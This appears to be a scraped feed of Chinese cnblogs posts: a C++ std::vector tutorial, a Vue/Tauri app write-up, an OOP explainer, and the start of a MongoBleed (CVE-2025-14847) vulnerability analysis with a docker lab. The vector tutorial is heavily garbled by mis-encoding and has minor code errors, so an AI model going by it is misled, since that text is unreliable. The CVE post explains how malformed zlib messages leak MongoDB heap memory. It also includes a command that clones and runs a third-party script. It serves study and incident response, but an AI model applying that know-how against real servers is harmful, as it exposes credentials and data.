·ï¼Œæ”¯æŒé€šè¿‡æŒ‡é’ˆåç§»é‡å¿«é€Ÿè®¿é—®ï¼Œå¹¶ä¸”å¯¹ CPU ç¼“å­˜ï¼ˆCacheï¼‰éžå¸¸å‹å¥½ã€‚</li>\n<li><strong>è‡ªåŠ¨æ‰©å®¹</strong>ï¼šå½“å­˜å…¥æ•°æ®é‡è¶…è¿‡å½“å‰å®¹é‡æ—¶ï¼Œ<code>std::vector</code> å°±ä¼šç”³è¯·ä¸€å—æ›´å¤§çš„å†…å­˜ï¼ˆé€šå¸¸æ˜¯åŽŸæ¥çš„ 1.5 å€æˆ– 2 å€ï¼‰ï¼Œå°†æ—§æ•°æ®ç§»åŠ¨/æ‹·è´è¿‡åŽ»ï¼Œç„¶åŽé‡Šæ”¾æ—§å†…å­˜ã€‚</li>\n</ul>\n<h2 id=\"åˆå§‹åŒ–ä¸Žæž„é€ \">åˆå§‹åŒ–ä¸Žæž„é€ </h2>\n<pre><code class=\"language-cpp\">#include &lt;vector&gt;\n\n// 1. é»˜è®¤æž„é€ ï¼ˆç©º vectorï¼‰\nstd::vector&lt;int&gt; v1;\n\n// 2. æŒ‡å®šå¤§å°å’Œé»˜è®¤å€¼\nstd::vector&lt;int&gt; v2(10);        // 10 ä¸ªå…ƒç´ ï¼Œé»˜è®¤åˆå§‹åŒ– 0\nstd::vector&lt;int&gt; v3(10, 5);     // 10 ä¸ªå…ƒç´ ï¼Œæ¯ä¸ªéƒ½æ˜¯ 5\n\n// 3. åˆ—è¡¨åˆå§‹åŒ–ï¼ˆC++11ï¼‰\nstd::vector&lt;int&gt; v4 = {1, 2, 3, 4};\n\n// 4. æ‹·è´æž„é€ \nstd::vector&lt;int&gt; v5(v4);\n\n// 5. è¿­ä»£å™¨èŒƒå›´æž„é€ ï¼ˆå¸¸ç”¨ä¸Žä»Žå…¶ä»–å®¹å™¨æ‹·è´ï¼‰\nint arr[] = {10, 20, 30}\nstd::vector&lt;int&gt; v6(arr, arr + 3);\n</code></pre>\n<h2 id=\"å®¹é‡ä¸Žå¤§å°\">å®¹é‡ä¸Žå¤§å°</h2>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\">å‡½æ•°</th>\n<th style=\"text-align: left;\">è¯´æ˜Ž</th>\n<th style=\"text-align: left;\">å¤‡æ³¨</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\"><code>size()</code></td>\n<td style=\"text-align: left;\">å½“å‰å…ƒç´ ä¸ªæ•°</td>\n<td style=\"text-align: left;\">å®žé™…å­˜äº†å¤šå°‘ä¸ª</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>capacity()</code></td>\n<td style=\"text-align: left;\">å½“å‰åˆ†é…çš„å†…å­˜èƒ½å­˜å¤šå°‘ä¸ª</td>\n<td style=\"text-align: left;\"><code>capacity</code> <span class=\"math inline\">\\(\\geqslant\\)</span> <code>size</code></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>empty()</code></td>\n<td style=\"text-align: left;\">æ˜¯å¦ä¸ºç©º</td>\n<td style=\"text-align: left;\">æŽ¨èä½¿ç”¨ï¼Œæ¯” <code>size() == 0</code> æ›´è¯­ä¹‰åŒ–</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>reserve()</code></td>\n<td style=\"text-align: left;\">é¢„åˆ†é…å†…å­˜</td>\n<td style=\"text-align: left;\">ä»…æ”¹å˜ <code>capacity</code>ï¼Œä¸æ”¹å˜ <code>size</code></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>resize(n)</code></td>\n<td style=\"text-align: left;\">æ”¹å˜å…ƒç´ ä¸ªæ•°</td>\n<td style=\"text-align: left;\">æ”¹å˜ <code>size</code>ï¼Œå¦‚æžœå˜å¤§åˆ™å¡«å……é»˜è®¤å€¼</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>shrink_to_fit()</code></td>\n<td style=\"text-align: left;\">é‡Šæ”¾æœªä½¿ç”¨çš„å†…å­˜ï¼ˆC++11ï¼‰</td>\n<td style=\"text-align: left;\">è®© <code>capacity</code> æœç´¢åˆ° <code>size</code> å¤§å°</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"ä¸ºä»€ä¹ˆ-reserve-éžå¸¸é‡è¦\">ä¸ºä»€ä¹ˆ <code>reserve</code> éžå¸¸é‡è¦ï¼Ÿ</h3>\n<pre><code class=\"language-cpp\">std::vector&lt;int&gt; v;\nv.reserve(1000); // ä¸€æ¬¡æ€§åˆ†é…å¥½å†…å­˜\nfor (int i = 0; i &lt; 1000; i++) {\n    v.push_back(i); // è¿™é‡Œä¸ä¼šå†å‘ç”Ÿå†…å­˜é‡æ–°åˆ†é…ï¼Œæ•ˆçŽ‡æžé«˜\n}\n</code></pre>\n<h2 id=\"å¢žåˆ æŸ¥æ”¹\">å¢žåˆ æŸ¥æ”¹</h2>\n<h3 id=\"æ’å…¥ä¸Žæ·»åŠ \">æ’å…¥ä¸Žæ·»åŠ </h3>\n<ul>\n<li><code>push_back(val)</code>ï¼šåœ¨å°¾éƒ¨æ·»åŠ å…ƒç´ ï¼ˆä¼šå‘ç”Ÿæ‹·è´æˆ–ç§»åŠ¨ï¼‰ã€‚</li>\n<li><code>emplace_back(arg...)</code>ï¼ˆC++11ï¼‰ï¼š<strong>åŽŸåœ°æž„é€ </strong>ã€‚ç›´æŽ¥åœ¨ <code>std::vector</code> å°¾éƒ¨æž„é€ å¯¹è±¡ï¼ŒçœåŽ»äº†ä¸€æ¬¡ä¸´æ—¶å¯¹è±¡çš„æž„é€ å’Œæ‹·è´ / ç§»åŠ¨ï¼Œ<strong>æ•ˆçŽ‡é€šå¸¸æ›´é«˜</strong>ã€‚</li>\n<li><code>insert(it, val)</code>ï¼šåœ¨è¿­ä»£å™¨æŒ‡å‘çš„ä½ç½®æ’å…¥ã€‚æ•ˆçŽ‡ä¸º <span class=\"math inline\">\\(O(N)\\)</span>ï¼Œå› ä¸ºè¦ç§»åŠ¨åŽç»­æ‰€æœ‰å…ƒç´ ã€‚</li>\n</ul>\n<h3 id=\"åˆ é™¤\">åˆ é™¤</h3>\n<ul>\n<li><code>pop_back</code>ï¼šåˆ é™¤å°¾éƒ¨å…ƒç´ ï¼ˆ<span class=\"math inline\">\\(O(1)\\)</span>ï¼‰ã€‚</li>\n<li><code>erase(it)</code>ï¼šåˆ é™¤æŒ‡å®šä½ç½®å…ƒç´ ï¼ˆ<span class=\"math inline\">\\(O(N)\\)</span>ï¼ŒåŽç»­å…ƒç´ å‰ç§»ï¼‰ã€‚</li>\n<li><code>clear()</code>ï¼šæ¸…ç©ºæ‰€æœ‰å…ƒç´ ï¼Œ<code>szie</code> å˜ä¸º 0ï¼Œä½† <code>capacity</code> é€šå¸¸ä¸å˜ï¼ˆå†…å­˜ä¸é‡Šæ”¾ï¼‰ã€‚</li>\n</ul>\n<h3 id=\"è®¿é—®\">è®¿é—®</h3>\n<ul>\n<li><code>v[i]</code>ï¼šä¸‹æ ‡è®¿é—®ï¼Œä¸æ£€æŸ¥è¶Šç•Œã€‚</li>\n<li><code>v.at[i]</code>ï¼šæ£€æŸ¥è¶Šç•Œï¼Œè¶Šè§‰æŠ› <code>std::out_of_range</code>ã€‚</li>\n<li><code>v.front()</code> / <code>v.back()</code>ï¼šè®¿é—®é¦–å°¾ã€‚</li>\n<li><code>v.data()</code>ï¼šè¿”å›žæŒ‡å‘åº•å±‚æ•°ç»„é¦–å…ƒç´ çš„æŒ‡é’ˆï¼ˆ<code>T*</code>ï¼‰ã€‚å¸¸ç”¨äºŽå’Œ C è¯­è¨€ API äº¤äº’ã€‚</li>\n</ul>\n<h2 id=\"è¿­ä»£å™¨å¤±æ•ˆ\">è¿­ä»£å™¨å¤±æ•ˆ</h2>\n<p>ç”±äºŽ <code>std::vector</code> æ˜¯è¿žç»­å†…å­˜ï¼Œå½“ç»“æž„å‘ç”Ÿå˜åŒ–æ—¶ï¼ŒæŒ‡å‘æ—§å†…å­˜çš„<strong>è¿­ä»£å™¨</strong>ã€<strong>æŒ‡é’ˆ</strong>ã€<strong>å¼•ç”¨</strong>å¯èƒ½ä¼šå¤±æ•ˆã€‚</p>\n<ol>\n<li>æ‰©å®¹æ—¶å¤±æ•ˆï¼šå½“ <code>push_back</code> å¯¼è‡´ <code>std::vector</code> æ‰©å®¹ï¼ˆ<code>reallocate</code>ï¼‰æ—¶ï¼ŒåŽŸå†…å­˜è¢«é‡Šæ”¾ï¼Œ<strong>æ‰€æœ‰</strong>æŒ‡å‘åŽŸæ•°æ®çš„è¿­ä»£å™¨ / æŒ‡é’ˆçž¬é—´å…¨éƒ¨å¤±æ•ˆã€‚</li>\n<li>æ’å…¥ / åˆ é™¤æ—¶å¤±æ•ˆï¼šå½“ <code>insert</code> æˆ– <code>erase</code> ä¸€ä¸ªä½ç½®æ—¶ï¼Œè¯¥ä½ç½®<strong>ä¹‹åŽ</strong>çš„æ‰€æœ‰è¿­ä»£å™¨éƒ½ä¼šå¤±æ•ˆï¼ˆå› ä¸ºæ•°æ®ç§»åŠ¨äº†ï¼‰ã€‚</li>\n</ol>\n<pre><code class=\"language-cpp\">std::vector&lt;int&gt; v = {1, 2, 3, 4};\nfor (auto it = v.begin(); it != v.end(); ++it) {\n    if (*it % 2 == 0) {\n        v.erase(it); // é”™è¯¯ï¼erase åŽ it å·²å¤±æ•ˆï¼Œä¸‹ä¸€æ¬¡ ++it ä¼šå´©æºƒ\n    }\n}\n\n// æ­£ç¡®å†™æ³•ï¼ˆåˆ©ç”¨ erase è¿”å›žå€¼æ›´æ–°è¿­ä»£å™¨ï¼‰\nfor (auto it =  v.begin(); it != v.end()) {\n    if (*it % 2 == 0) {\n        it = v.erase(it); // erase è¿”å›žæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ çš„è¿­ä»£å™¨\n    } else {\n        ++it;\n    }\n}\n</code></pre>\n<h2 id=\"ç‰¹æ®Šç‰ˆæœ¬stdvectorbool\">ç‰¹æ®Šç‰ˆæœ¬ï¼š<code>std::vector&lt;bool&gt;</code></h2>\n<p>è¿™æ˜¯ä¸€ä¸ªåŽ†å²é—ç•™çš„ â€œå‘â€ã€‚ä¸ºäº†èŠ‚çœç©ºé—´ï¼ŒC++ æ ‡å‡†åº“ç‰¹åŒ–äº† <code>std::vector&lt;bool&gt;</code>ï¼Œå®ƒä¸æ˜¯å­˜å‚¨ <code>bool</code>ï¼ˆ1 å­—èŠ‚ï¼‰ï¼Œè€Œæ˜¯å­˜å‚¨ <code>bit</code>ï¼ˆ1 æ¯”ç‰¹ï¼‰ã€‚</p>\n<p>åŽæžœï¼š</p>\n<ul>\n<li>ä½ æ— æ³•èŽ·å¾—å…ƒç´ çš„åœ°å€ï¼š<code>&amp;v[0]</code> æ˜¯éžæ³•çš„ï¼Œå› ä¸ºæ— æ³•å¯»å€å•ä¸ªæ¯”ç‰¹ã€‚</li>\n<li>å®ƒçš„ <code>operator[]</code> è¿”å›žçš„ä¸æ˜¯ <code>bool&amp;</code>ï¼Œè€Œæ˜¯ä¸€ä¸ªä»£ç†å¯¹è±¡ã€‚</li>\n<li><strong>éžçº¿ç¨‹å®‰å…¨</strong>ï¼šå¹¶å‘è¯»å†™é‚»è¿‘çš„ bit å¯èƒ½ä¼šå¯¼è‡´æ•°æ®ç«žäº‰ï¼ˆå› ä¸ºå®ƒä»¬ä½äºŽåŒä¸€ä¸ªå­—èŠ‚å†…ï¼‰ã€‚</li>\n</ul>\n<p>å»ºè®®ï¼šå¦‚æžœéœ€è¦å­˜å¸ƒå°”å€¼ä¸”ä¸ç¼ºé‚£ç‚¹å†…å­˜ï¼Œç”¨ <code>std::vector&lt;char&gt;</code> æˆ– <code>std::deque&lt;bool&gt;</code> ä»£æ›¿ã€‚å¦‚æžœç¡®å®žéœ€è¦ä½æ“ä½œï¼Œè€ƒè™‘ä½¿ç”¨ <code>std::bitset</code>ã€‚</p>\n<h2 id=\"çŽ°ä»£åŒ–æ“ä½œ\">çŽ°ä»£åŒ–æ“ä½œ</h2>\n<h3 id=\"c20stderase-å’Œ-stderase_if\">C++20ï¼š<code>std::erase</code> å’Œ <code>std::erase_if</code></h3>\n<p>åœ¨ C++20 ä¹‹å‰ï¼Œè¦ä»Ž <code>std::vector</code> ä¸­åˆ é™¤æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„æ‰€ä»¥å…ƒç´ ï¼Œéœ€è¦ä½¿ç”¨ \"Erase-Remove Idiom\"ï¼ˆ<code>v.erase(std::remove(...), v.end()ï¼‰</code>ï¼Œéžå¸¸å•°å—¦ã€‚</p>\n<p>C++20 ç®€åŒ–äº†ï¼š</p>\n<pre><code class=\"language-cpp\">std::vector&lt;int&gt; v = {1, 2, 3, 4, 5, 6};\n\n// åˆ é™¤æ‰€æœ‰å¶æ•°\nstd::erase_if(v, [](int x) { return x % 2 == 0; });\n</code></pre>\n<h2 id=\"æœ€ä½³å®žè·µ\">æœ€ä½³å®žè·µ</h2>\n<ol>\n<li>ä¼˜å…ˆä½¿ç”¨ <code>emplace_back</code>ï¼šä»£æ›¿ <code>push_back</code>ï¼Œç‰¹åˆ«æ˜¯å­˜æ”¾å¤æ‚å¯¹è±¡æ—¶ã€‚</li>\n<li>å–„ç”¨ <code>reserve</code>ï¼šå¦‚æžœä½ èƒ½é¢„ä¼°æ•°æ®é‡ï¼Œä¸€å®šè¦å…ˆ <code>reserve</code>ï¼Œåœ¨æ•°æ®é‡è¾ƒå¤§æ—¶ï¼Œèƒ½å¤Ÿæžå¤§çš„ä¼˜åŒ–æ€§èƒ½ã€‚</li>\n<li>é¿å…å¤´éƒ¨/ä¸­é—´æ’å…¥ï¼šåœ¨ <code>std::vector</code> å¤´éƒ¨æ’å…¥æ•°æ®ï¼ˆ<code>insert(begin(), val)</code>ï¼‰æ˜¯éžå¸¸æ…¢çš„ï¼ˆ<span class=\"math inline\">\\(O(N)\\)</span>ï¼‰ï¼Œå¦‚æžœæœ‰è¿™ç§éœ€æ±‚ï¼Œè¯·æ”¹ç”¨ <code>std::deque</code> æˆ– <code>std::list</code>ã€‚</li>\n<li>æ…Žç”¨ <code>std::vector&lt;bool&gt;</code>ï¼šé™¤éžä½ æ¸…æ¥šä½ è‡ªå·±åœ¨åšä»€ä¹ˆã€‚</li>\n<li>å°å¿ƒå¼•ç”¨å¤±æ•ˆï¼šåœ¨å¾ªçŽ¯ä¸­åš <code>push_back</code> æ—¶ï¼Œåƒä¸‡ä¸è¦åŒæ—¶æŒæœ‰æŒ‡å‘è¯¥ <code>std::vector</code> å†…éƒ¨å…ƒç´ çš„å¼•ç”¨ï¼Œä¸€æ—¦æ‰©å®¹ï¼Œå¼•ç”¨å°±å˜æˆæ‚¬ç©ºæŒ‡é’ˆäº†ã€‚</li>\n</ol>\n<hr />\n<blockquote>\n<p>ðŸ“¢ <strong>å†™åœ¨æœ€åŽ</strong></p>\n<p>å¦‚æžœä½ è§‰å¾—è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿Žåˆ°æˆ‘çš„ä¸ªäººåšå®¢ <strong><a href=\"https://bfmhno3.github.io/\" rel=\"noopener nofollow\" target=\"_blank\">Better Mistakes</a></strong> é€›é€›ã€‚</p>\n<p>åœ¨é‚£é‡Œæˆ‘å½’æ¡£äº†æ›´å¤šé«˜è´¨é‡çš„æŠ€æœ¯æ–‡ç« ï¼Œä¹Ÿæ¬¢è¿Žé€šè¿‡ RSS è®¢é˜…æˆ‘çš„æœ€æ–°åŠ¨æ€ï¼</p>\n</blockquote>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-03 23:00</span>&nbsp;\n<a href=\"https://www.cnblogs.com/bfmhno3\">ç•¥æ— æ…•è‰³æ„</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">48</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "使用Vue 3 + TypeScript + Tauri实现一个即插即用的轻量级可执行程序",
      "link": "https://www.cnblogs.com/LEMONIX/p/19435059",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/LEMONIX/p/19435059\" id=\"cb_post_title_url\" title=\"发布于 2026-01-03 22:20\">\n    <span>使用Vue 3 + TypeScript + Tauri实现一个即插即用的轻量级可执行程序</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p>在学校由于数据结构这门课的难理解性，我就想能不能实现一个演示动画放入优盘 不记得了或者忘了随时点击exe就可以查看。查阅了一些资料最后选择了Vue 3 + TypeScript + Tauri的架构，最后走出来整个数据结构核心动画才8731kb</p>\n<h1>项目采用了如下技术栈：</h1>\n<ul>\n<li>\n<p><strong>前端框架</strong>：Vue 3 + Composition API<br />\n用响应式数据驱动动画，逻辑清晰，状态可控。</p>\n\n</li>\n<li>\n<p><strong>开发语言</strong>：TypeScript<br />\n强类型约束让算法实现更严谨，也更适合教学示例。</p>\n\n</li>\n<li>\n<p><strong>桌面封装</strong>：Tauri<br />\n核心选择。相比 Electron，Tauri 基于 Rust + 系统原生 WebView，体积小、启动快，生成的 <code>.exe</code> 非常轻量。</p>\n\n</li>\n<li>\n<p><strong>图结构渲染</strong>：vis-network<br />\n适合处理树、图等复杂关系结构。</p>\n\n</li>\n<li>\n<p><strong>UI 组件库</strong>：Element Plus<br />\n保证整体界面简洁、易用，降低教学操作成本。</p>\n\n</li>\n<li></li>\n\n</ul>\n<h1>算法与动画彻底分离</h1>\n<p>传统写法中，排序或遍历算法往往直接操作 DOM 或样式，导致逻辑和视图强耦合，代码既难读也难维护。</p>\n<p>在 项目中，整体思路是：</p>\n<ul>\n<li>\n<p><strong>算法只负责计算</strong></p>\n\n</li>\n<li>\n<p><strong>动画只负责播放</strong></p>\n\n</li>\n<li>\n<p>两者通过“动画帧”进行通信</p>\n\n</li>\n\n</ul>\n<p>简单来说，流程是这样的：</p>\n<blockquote>\n<p>算法函数（纯逻辑） → 生成动画帧序列 → 播放器逐帧渲染 → UI 展示</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3058226/202601/3058226-20260103221017692-588293223.png\" /></p>\n<p>&nbsp;</p>\n<h1>&nbsp;Tauri</h1>\n<p>简单讲解一下这个:</p>\n<p>Electron打包出来的程序太大,它会把 <strong>整个 Chrome 浏览器</strong> 和 <strong>整个 Node.js 环境</strong> 都塞进你的 <code>.exe</code> 里。</p>\n<p>Tauri 的后端是用 Rust 写的。Rust 不需要打包一个虚拟机（Runtime）。它会直接调用你电脑系统自带的浏览器内核（Windows 上是 Edge WebView2 【window11,12都可】）。</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3058226/202601/3058226-20260103221557607-1387745295.png\" /></p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3058226/202601/3058226-20260103221646295-1529611106.png\" /></p>\n<p>&nbsp;</p>\n<p>&nbsp;最后的效果看起来很不错，响应速度很快， 内存很小，对于小型项目这个方案还是很不错的。</p>\n\n</blockquote>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-03 22:20</span>&nbsp;\n<a href=\"https://www.cnblogs.com/LEMONIX\">博客101</a>&nbsp;\n阅读(<span id=\"post_view_count\">165</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "面向对象三大特点(封装、继承、多态)",
      "link": "https://www.cnblogs.com/xi-yongqi/p/19434736",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xi-yongqi/p/19434736\" id=\"cb_post_title_url\" title=\"发布于 2026-01-03 19:08\">\n    <span>面向对象三大特点(封装、继承、多态)</span>\n    \n\n</a>\n\n\t\t</h1>\n\t\t<div class=\"clear\"></div>\n\t\t<div class=\"postBody\">\n\t\t\t<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p><strong>面向对象编程有三大特性：封装、继承、多态。</strong></p>\n<h4 id=\"封装\">封装</h4>\n<ol>\n<li>封装是指将对象的属性（数据，如变量）和行为（操作数据的方法，如函数）捆绑在一起，同时隐藏对象内部的实现细节。</li>\n<li>核心目的</li>\n</ol>\n<ul>\n<li>提高代码安全性：防止外部程序随意篡改对象的内部属性，避免无效数据的产生。</li>\n<li>提升代码可维护性：内部实现细节的修改不会影响外部调用者，降低代码耦合度。</li>\n<li>增强代码复用性：封装后的类可以作为独立模块被多次引用。</li>\n</ul>\n<ol start=\"3\">\n<li>具体实现：</li>\n</ol>\n<ul>\n<li>使用 private 修饰成员变量</li>\n<li>提供 public的getter/setter方法</li>\n</ul>\n<pre><code class=\"language-java\">public class User {\n    private String name;\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n}\n\n</code></pre>\n<hr />\n<h4 id=\"继承\">继承</h4>\n<ol>\n<li>继承：子类(派生类)继承父类(基类/超类)的属性和方法，实现代码复用，并建立 is-a 关系。子类无需重新编写父类的已有代码，同时还能根据需求扩展自身的独有属性和方法，甚至重写父类的方法。</li>\n<li>核心目的</li>\n</ol>\n<ul>\n<li>最大化代码复用：减少冗余代码，提高开发效率。</li>\n<li>建立类的层次关系：清晰梳理类与类之间的逻辑关联（如“学生”是“人”的一种）。</li>\n<li>为多态提供基础支撑。</li>\n</ul>\n<ol start=\"3\">\n<li>具体实现</li>\n</ol>\n<pre><code class=\"language-java\">class Animal {\n    void eat() {}\n}\n\nclass Dog extends Animal {\n    void bark() {}\n}\n</code></pre>\n<ol start=\"4\">\n<li>注意事项：</li>\n</ol>\n<ul>\n<li>Java只支持单继承，Python支持多继承。</li>\n<li>可以多层继承</li>\n<li>可以实现多个接口</li>\n</ul>\n<hr />\n<h4 id=\"多态\">多态</h4>\n<ol>\n<li>多态：同一个方法调用，在不同对象上表现出不同的行为。</li>\n<li>多态前提(java中)</li>\n</ol>\n<ul>\n<li>有继承或接口关系</li>\n<li>方法重写</li>\n<li>父类引用指向子类对象</li>\n</ul>\n<ol start=\"3\">\n<li>目的：</li>\n</ol>\n<ul>\n<li>提高代码灵活性，降低代码耦合度</li>\n<li>增强代码可扩展性，完美契合 “开闭原则”</li>\n<li>简化代码结构，提高代码可维护性</li>\n</ul>\n<ol start=\"4\">\n<li>代码示例：</li>\n</ol>\n<pre><code class=\"language-java\">// 1. 存在继承关系（父类Person）\nclass Person {\n    // 父类方法（非private、非static、非final，可被重写）\n    public void work() {\n        System.out.println(\"普通人的工作\");\n    }\n}\n\n// 子类Student，继承Person\nclass Student extends Person {\n    // 2. 方法重写（严格遵循方法签名一致）\n    @Override\n    public void work() {\n        System.out.println(\"学生的工作：上课学习\");\n    }\n}\n\n// 子类Teacher，继承Person\nclass Teacher extends Person {\n    // 2. 方法重写\n    @Override\n    public void work() {\n        System.out.println(\"老师的工作：备课授课\");\n    }\n}\n\npublic class PolymorphismTest {\n    public static void main(String[] args) {\n        // 3. 父类引用指向子类对象（核心条件）\n        Person p1 = new Student();\n        Person p2 = new Teacher();\n        \n        // 触发多态：调用同一方法，呈现不同行为\n        p1.work(); // 输出：学生的工作：上课学习\n        p2.work(); // 输出：老师的工作：备课授课\n    }\n}\n</code></pre>\n<ol start=\"5\">\n<li>java与python多态前提条件的区别</li>\n</ol>\n<p><strong>二者的差异根源是 Java 为静态强类型语言（约束严格），Python 为动态弱类型语言（约束宽松，灵活度更高），具体前提条件对比如下：</strong></p>\n<table>\n<thead>\n<tr>\n<th>对比维度</th>\n<th>Java 多态（必背，缺一不可）</th>\n<th>Python 多态（无强制约束，灵活宽松）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>继承/接口依赖</td>\n<td>必须具备类继承关系或接口实现关系，无此关系无法实现多态</td>\n<td>无需强制依赖！① 支持继承（单 / 多继承）实现多态（与 Java 类似）；② 核心支持<a href=\"https://www.cnblogs.com/xi-yongqi/p/19167194\" target=\"_blank\">鸭子类型</a>：无任何继承 / 接口，只要对象拥有目标方法即可实现多态</td>\n</tr>\n<tr>\n<td>方法重写要求</td>\n<td>严格遵循规则：方法名、参数列表、返回值必须一致；父类方法不能是private/static/final；推荐显式标注@Override</td>\n<td>无严格规则，仅需子类与父类方法同名即可视为 “重写”；可灵活修改参数 / 返回值；无强制@Override标注</td>\n</tr>\n<tr>\n<td>对象引用绑定</td>\n<td>必须满足父类/接口引用指向子类/实现类对象（静态类型声明为父类，实际指向子类实例），这是触发多态的关键</td>\n<td>完全不需要！Python变量无固定类型声明，无需刻意绑定父类引用，直接使用子类实例或符合方法要求的对象即可触发多态</td>\n</tr>\n</tbody>\n</table>\n\n</div>\n<div class=\"clear\"></div>\n\n\t\t</div>\n\t\t<div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-03 19:08</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xi-yongqi\">我会替风去</a>&nbsp;\n阅读(<span id=\"post_view_count\">64</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "深度分析MangoBleed(CVE-2025-14847)",
      "link": "https://www.cnblogs.com/DSchenzi/p/19434377",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/DSchenzi/p/19434377\" id=\"cb_post_title_url\" title=\"发布于 2026-01-03 15:22\">\n    <span>深度分析MangoBleed(CVE-2025-14847)</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"mangobleedcve-2025-14847\">MangoBleed(CVE-2025-14847)</h1>\n<p>本文分析了CVE-2025-14847漏洞原理、漏洞复现以及结合了HTB靶场的Sherlock进行综合分析日志。</p>\n<h2 id=\"sherlock-scenario\">Sherlock Scenario</h2>\n<p>You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.</p>\n<p>You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.</p>\n<h2 id=\"task1\">Task1</h2>\n<p>What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?</p>\n<p>网上搜一下也就是最近爆出来的</p>\n<p><strong>CVE-2025-14847</strong></p>\n<h3 id=\"漏洞简介\">漏洞简介</h3>\n<ul>\n<li>\n<p>类型：无认证远程堆内存泄露</p>\n</li>\n<li>\n<p>危害：攻击者无需认证即可从服务器内存中提取敏感数据，可能包括数据库凭证、API密钥、会话令牌、用户数据等</p>\n</li>\n</ul>\n<h3 id=\"漏洞原理\">漏洞原理</h3>\n<p>根源在于MongoDB的zlib网络消息压缩处理逻辑：</p>\n<ul>\n<li>MongoDB支持客户端发送压缩消息。</li>\n<li>攻击者发送特质畸形的压缩包，在消息头中故意制造长度字段不一致</li>\n<li>服务器在解压时会分配过大缓冲区，并错误地将未初始化地堆内存作为有效数据返回给攻击者。</li>\n<li>此过程多次发送不同偏移的畸形请求，攻击者可逐步提取内存碎片，聚合后可能恢复敏感信息。</li>\n<li>不是直接RCE，但泄露的凭证可导致后续横向移动或数据窃取。</li>\n</ul>\n<h3 id=\"受影响版本\">受影响版本</h3>\n<p>几乎所有2017年以来启用zlib压缩的MongoDB Server版本，包括主流分支:</p>\n<ul>\n<li>8.x系列（至8.2.2）</li>\n<li>7.0.x、6.0.x、5.0.x、4.4.x等遗留版本</li>\n<li>具体：影响4.4、5.0、6.0、7.0、8.0全系列（直到2025年11月版本）</li>\n</ul>\n<h3 id=\"环境搭建\">环境搭建</h3>\n<p>1.docker环境</p>\n<p>docker-compose.yml</p>\n<pre><code class=\"language-yml\">version: '3.8'\n\nservices:\n  # 受漏洞影响的版本（开启 Zlib）\n  mongodb-vulnerable:\n    image: mongo:6.0.14\n    container_name: mongodb-vulnerable\n    ports:\n      - \"27017:27017\"\n    command: mongod --networkMessageCompressors snappy,zlib\n\n  # 已修复的版本（用于对比测试）\n  mongodb-patched:\n    image: mongo:6.0.27\n    container_name: mongodb-patched\n    ports:\n      - \"27018:27017\"\n    command: mongod --networkMessageCompressors snappy,zlib\n\nvolumes:\n  mongodb-data:\n  mongodb-patched-data:\n</code></pre>\n<p>拉取镜像</p>\n<pre><code class=\"language-kotlin\">docker-compose up -d\n</code></pre>\n<p>拉取失败的可以使用这个仓库的镜像源配置工具:</p>\n<pre><code class=\"language-kotlin\">git clone https://github.com/hzhsec/docker_proxy.git\nchmod +x *.sh\n./docker-proxy.sh\n</code></pre>\n<p>等镜像源换完，再拉取</p>\n<pre><code>docker-compose up -d\n</code></pre>\n<p><img alt=\"image-20260101223837974\" 